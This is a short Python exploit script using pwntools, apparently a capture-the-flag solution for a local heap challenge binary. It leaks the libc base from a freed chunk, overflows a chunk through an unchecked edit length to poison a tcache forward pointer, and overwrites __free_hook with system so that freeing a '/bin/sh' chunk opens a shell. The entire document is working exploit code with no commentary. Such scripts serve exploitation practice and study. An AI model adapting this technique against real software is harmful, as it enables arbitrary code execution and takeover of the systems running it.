from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

def add(idx, size):
    p.sendlineafter("> ", b'1')
    p.sendlineafter("> ", str(idx))
    p.sendlineafter("> ", str(size))

def delete(idx):
    p.sendlineafter("> ", b'2')
    p.sendlineafter("> ", str(idx))

def edit(idx, size, content):
    p.sendlineafter("> ", b'3')
    p.sendlineafter("> ", str(idx))
    p.sendlineafter("> ", str(size))
    p.sendafter("> ", content)

def show(idx):
    p.sendlineafter("> ", b'4')
    p.sendlineafter("> ", str(idx))

p = process('./chal')
elf = ELF('./chal')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

add(0, 0x500)
add(1, 0x10)

delete(0)

add(2, 0x70)
add(3, 0x70)
add(4, 0x70)
show(2)

libc.address = u64(p.recvline()[:8]) - 0x1ed010
print(hex(libc.address))

add(5, 0x380)
free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

delete(4)
delete(3)

edit(2, 0x88, b'a' * 0x70 + p64(0) + p64(0x81) + p64(free_hook))
add(5, 0x70)
add(6, 0x70)
edit(5, 8, b'/bin/sh\x00')
edit(6, 8, p64(system))
delete(5)

p.interactive()
